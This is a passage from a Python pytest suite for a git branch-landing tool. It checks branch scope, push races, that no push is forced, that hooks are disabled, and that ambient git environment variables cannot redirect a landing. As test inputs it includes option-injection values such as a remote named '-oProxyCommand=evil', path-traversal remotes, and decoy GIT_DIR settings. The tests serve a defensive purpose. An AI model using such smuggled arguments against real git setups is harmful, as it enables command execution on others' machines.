        .replace("${{ github.repository }}", "o/r")
    )


def _scope_check(tmp_path: Path, branch: str, files: dict[str, str]) -> subprocess.CompletedProcess:
    bare = tmp_path / "scope-remote.git"
    work = tmp_path / "scope-work"
    subprocess.run(["git", "init", "-q", "--bare", "-b", "main", str(bare)], check=True)
    work.mkdir()
    _git(work, "init", "-q", "-b", "main")
    _git(work, "config", "user.email", "steward@gaiaskilltree.invalid")
    _git(work, "config", "user.name", "Gaia Steward")
    _git(work, "config", "commit.gpgsign", "false")
    _write(work / "README.md", "base\n")
    _commit(work, "base")
    _git(work, "remote", "add", "origin", str(bare))
    _git(work, "push", "-q", "origin", "main")
    _git(work, "checkout", "-q", "-b", branch)
    for relative, content in files.items():
        _write(work / relative, content)
    _commit(work, "landing")
    env = {
        **os.environ, "BRANCH": branch, "BASE_REF": "main", "PR_NUMBER": "1", "GH_TOKEN": "unused",
    }
    return subprocess.run(
        ["bash", "-c", _scope_script()], cwd=work, env=env, capture_output=True, text=True
    )


@pytest.mark.parametrize(
    ("branch", "files", "passes"),
    [
        ("steward/a/agent-skill-mirror-drift-0123456789ab", {".claude/skills/x/SKILL.md": "a"}, True),
        ("steward/a/agent-skill-mirror-drift-0123456789ab", {".agents/skills/x/SKILL.md": "a"}, True),
        ("steward/a/bundled-schema-mirror-drift-0123456789ab", {"src/gaia_cli/data/registry/schema/a.json": "{}"}, True),
        ("steward/a/agent-skill-mirror-drift-0123456789ab", {".claude/skills/x/SKILL.md": "a", "src/app.py": "b"}, False),
        ("steward/a/bundled-schema-mirror-drift-0123456789ab", {"registry/schema/a.json": "{}"}, False),
        ("steward/a/agent-skill-mirror-drift-0123456789ab", {"scripts/evil.py": "x"}, False),
        # Existing arms are unchanged.
        ("infra/ci-fix", {".github/workflows/x.yml": "x"}, True),
        ("docs/page", {"src/app.py": "x"}, False),
        ("schema/rename", {"src/gaia_cli/data/registry/schema/a.json": "{}"}, True),
    ],
)
def test_branch_scope_allows_only_steward_mirror_paths(
    tmp_path: Path, branch: str, files: dict[str, str], passes: bool
) -> None:
    result = _scope_check(tmp_path, branch, files)
    assert (result.returncode == 0) is passes, result.stdout + result.stderr
    if passes and branch.startswith("steward/a/"):
        assert "prefix 'steward-a'" in result.stdout


# --- D10: race classification on both paths ---------------------------------------------


def _racing(repo: Path, plan: LandingPlan, calls: dict, monkeypatch: pytest.MonkeyPatch, *, then=None):
    """First remote-branch query reports 'absent' after a competitor pushed the name."""

    original = landing._remote_branch_head

    def racing(root: Path, pl: LandingPlan):
        calls["n"] = calls.get("n", 0) + 1
        if calls["n"] == 1:
            competitor = _commit_tree(repo, "HEAD", "competitor, not a descendant of the base")
            _git(repo, "push", "-q", "origin", f"{competitor}:refs/heads/{pl.branch}")
            calls["competitor"] = competitor
            return None
        if then is not None:
            return then(root, pl)
        return original(root, pl)

    monkeypatch.setattr(landing, "_remote_branch_head", racing)


def test_a_push_race_on_the_fresh_path_is_already_exists_and_never_overwrites(
    fixture, monkeypatch: pytest.MonkeyPatch
) -> None:
    repo, bare = fixture
    plan = _plan(repo)
    calls: dict = {}
    _racing(repo, plan, calls, monkeypatch)

    result = execute_class_a_landing(repo, _policy(repo), plan, push=True)

    assert result.status == "already-exists"
    assert _git(bare, "rev-parse", f"refs/heads/{plan.branch}") == calls["competitor"]


def test_a_push_race_on_the_resume_path_is_already_exists_and_never_overwrites(
    fixture, monkeypatch: pytest.MonkeyPatch
) -> None:
    repo, bare = fixture
    plan = _plan(repo)
    assert execute_class_a_landing(repo, _policy(repo), plan, push=False).status == "branch-committed"
    calls: dict = {}
    _racing(repo, plan, calls, monkeypatch)

    result = execute_class_a_landing(repo, _policy(repo), plan, push=True)

    assert result.status == "already-exists"
    assert _git(bare, "rev-parse", f"refs/heads/{plan.branch}") == calls["competitor"]


@pytest.mark.parametrize("resume", [False, True])
def test_a_failing_classification_after_a_refused_push_is_blocked_not_raised(
    fixture, monkeypatch: pytest.MonkeyPatch, resume: bool
) -> None:
    repo, bare = fixture
    plan = _plan(repo)
    if resume:
        assert execute_class_a_landing(repo, _policy(repo), plan, push=False).status == "branch-committed"

    def network_down(root: Path, pl: LandingPlan):
        raise LandingError("network down")

    calls: dict = {}
    _racing(repo, plan, calls, monkeypatch, then=network_down)

    result = execute_class_a_landing(repo, _policy(repo), plan, push=True)

    assert result.status == "blocked" and "network down" in result.reason
    assert _git(bare, "rev-parse", f"refs/heads/{plan.branch}") == calls["competitor"]


# --- D12: nothing in the plan is trusted ---------------------------------------------------


def test_the_branch_must_derive_from_the_fingerprint(fixture) -> None:
    repo, bare = fixture
    plan = _plan(repo)
    forged = LandingPlan(**{**plan.__dict__, "branch": "steward/a/my-own-name"})
    with pytest.raises(LandingError, match="derive from the debt fingerprint"):
        execute_class_a_landing(repo, _policy(repo), forged, push=True)
    other_kind = LandingPlan(**{**plan.__dict__, "branch": "steward/a/other-kind-" + plan.fingerprint[:12]})
    with pytest.raises(LandingError, match="derive from the debt fingerprint"):
        execute_class_a_landing(repo, _policy(repo), other_kind, push=True)
    assert _remote_branches(bare) == ""


def test_remotes_must_be_configured_and_not_option_shaped(fixture) -> None:
    repo, _ = fixture
    plan = _plan(repo)
    for remote in ("-oProxyCommand=evil", "not-configured", "evil/rel", "../evil", "/abs"):
        with pytest.raises(LandingError):
            plan_class_a_landing(repo, _policy(repo), _debt(), base_branch=BASE, remote=remote)
        with pytest.raises(LandingError):
            execute_class_a_landing(
                repo, _policy(repo), LandingPlan(**{**plan.__dict__, "remote": remote}), push=True
            )
    _git(repo, "config", "remote.origin.url", "-oBadOption")
    with pytest.raises(LandingError, match="unsafe URL"):
        _plan(repo)


# --- mutation gaps ---------------------------------------------------------------------------


def _record_git(monkeypatch: pytest.MonkeyPatch) -> list[tuple[str, ...]]:
    real = landing._git
    calls: list[tuple[str, ...]] = []

    def spy(cwd, *args, **kwargs):
        calls.append(tuple(args))
        return real(cwd, *args, **kwargs)

    monkeypatch.setattr(landing, "_git", spy)
    return calls


@pytest.mark.parametrize("resume", [False, True])
def test_no_push_is_ever_forced(fixture, monkeypatch: pytest.MonkeyPatch, resume: bool) -> None:
    repo, _ = fixture
    plan = _plan(repo)
    if resume:
        assert execute_class_a_landing(repo, _policy(repo), plan, push=False).status == "branch-committed"
    calls = _record_git(monkeypatch)

    assert execute_class_a_landing(repo, _policy(repo), plan, push=True).status == "branch-pushed"

    pushes = [call for call in calls if call[:1] == ("push",)]
    assert len(pushes) == 1
    flags = [item for item in pushes[0] if item.startswith("-") or item.startswith("+") or ":+" in item]
    assert flags == ["--quiet"]
    assert pushes[0][-1] == f"refs/heads/{plan.branch}:refs/heads/{plan.branch}"


def test_every_git_call_disables_hooks(fixture, monkeypatch: pytest.MonkeyPatch) -> None:
    repo, _ = fixture
    seen: list[list[str]] = []
    real = subprocess

    class Shim:
        def __getattr__(self, name: str):
            return getattr(real, name)

        @staticmethod
        def run(command, *args, **kwargs):
            seen.append(list(command))
            return real.run(command, *args, **kwargs)

    monkeypatch.setattr(landing, "subprocess", Shim())
    assert execute_class_a_landing(repo, _policy(repo), _plan(repo), push=True).status == "branch-pushed"
    assert len(seen) > 10 and all(command[0] == "git" for command in seen)
    wanted = ["-c", f"core.hooksPath={os.devnull}"]
    assert all(command[1:3] == wanted for command in seen), [
        command[:4] for command in seen if command[1:3] != wanted
    ]


def test_ambient_git_environment_cannot_redirect_a_landing(
    fixture, tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    repo, bare = fixture
    decoy = tmp_path / "decoy"
    decoy.mkdir()
    _git(decoy, "init", "-q")
    plan = _plan(repo)
    ambient = {
        "GIT_DIR": str(decoy / ".git"), "GIT_WORK_TREE": str(decoy),
        "GIT_INDEX_FILE": str(decoy / "index-decoy"), "GIT_COMMON_DIR": str(decoy / ".git"),
        "GIT_AUTHOR_NAME": "Mallory", "GIT_COMMITTER_EMAIL": "mallory@example.invalid",
    }
    for key, value in ambient.items():
        monkeypatch.setenv(key, value)

    result = execute_class_a_landing(repo, _policy(repo), plan, push=True)

    for key in ambient:  # the test's own git helper must see a normal environment again
        monkeypatch.delenv(key)
    assert result.status == "branch-pushed", result.reason
    assert _git(bare, "log", "-1", "--format=%an <%ae> / %cn <%ce>", plan.branch) == (
        "Gaia Steward <steward@gaiaskilltree.invalid> / Gaia Steward <steward@gaiaskilltree.invalid>"
    )
    assert not (decoy / "index-decoy").exists()
    assert _git(decoy, "status", "--porcelain") == ""
    assert os.environ.get("GIT_DIR") is None


def test_the_process_environment_is_restored_after_a_landing(
    fixture, tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    repo, _ = fixture
    plan = _plan(repo)
    monkeypatch.setenv("GIT_TERMINAL_PROMPT", "1")
    monkeypatch.setenv("GIT_CEILING_DIRECTORIES", str(tmp_path))
    before = dict(os.environ)
    execute_class_a_landing(repo, _policy(repo), plan, push=False)
    assert dict(os.environ) == before


def test_the_callers_stash_branches_and_staged_edits_survive_a_landing(fixture) -> None:
    repo, _ = fixture
    _write(repo / ".claude/skills/x/SKILL.md", "# caller staged edit\n")
    _git(repo, "add", "-A")
    _write(repo / ".claude/skills/x/SKILL.md", "# caller unstaged edit on top\n")
    _write(repo / "stash-me.txt", "s\n")
    _git(repo, "stash", "push", "-u", "-q", "-m", "mine")
    _write(repo / "untracked.txt", "u\n")
    plan = _plan(repo)

    def snapshot() -> dict[str, str]:
        return {
            "head": _git(repo, "rev-parse", "HEAD"),
            "status": _git(repo, "status", "--porcelain=v1", "-uall"),
            "index": _git(repo, "ls-files", "--stage"),
            "stash": _git(repo, "stash", "list"),
            "diff": _git(repo, "diff"),
            "cached": _git(repo, "diff", "--cached"),
            "heads": _git(repo, "for-each-ref", "--format=%(refname) %(objectname)", "refs/heads"),
            "config": _git(repo, "config", "--local", "-l"),
        }

    before = snapshot()
    assert execute_class_a_landing(repo, _policy(repo), plan, push=True).status == "branch-pushed"
    assert snapshot() == before


def test_git_redirecting_variables_are_absent_inside_the_repair_and_restored_after(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    monkeypatch.setenv("GIT_DIR", "/nowhere")
    monkeypatch.setenv("GIT_INDEX_FILE", "/nowhere/index")
    monkeypatch.setenv("UNRELATED", "kept")
    with landing._without_git_env():
        assert "GIT_DIR" not in os.environ and "GIT_INDEX_FILE" not in os.environ
        assert os.environ["UNRELATED"] == "kept"
    assert os.environ["GIT_DIR"] == "/nowhere" and os.environ["GIT_INDEX_FILE"] == "/nowhere/index"


def test_a_stale_branch_that_edits_locally_owned_mirror_paths_is_rebuilt(fixture) -> None:
    repo, bare = fixture
    _push_base(repo, {
        ".agents/skills/skill-creator/SKILL.md": "# canonical local-only\n",
        ".claude/skills/skill-creator/SKILL.md": "# mine\n",
    }, "locally owned mirror path")
    plan = _plan(repo)
    commit, _base = _landing_commit(repo, plan)
    tampered = _detached_edit(
        repo, commit, lambda: _write(repo / ".claude/skills/skill-creator/SKILL.md", "# tampered\n")
    )
    _git(repo, "branch", "-f", plan.branch, tampered)

    result = execute_class_a_landing(repo, _policy(repo), plan, push=True)

    _assert_clean_landing(repo, bare, plan, result)
    assert result.commit != tampered
    assert _git(bare, "show", f"{plan.branch}:.claude/skills/skill-creator/SKILL.md") == "# mine"
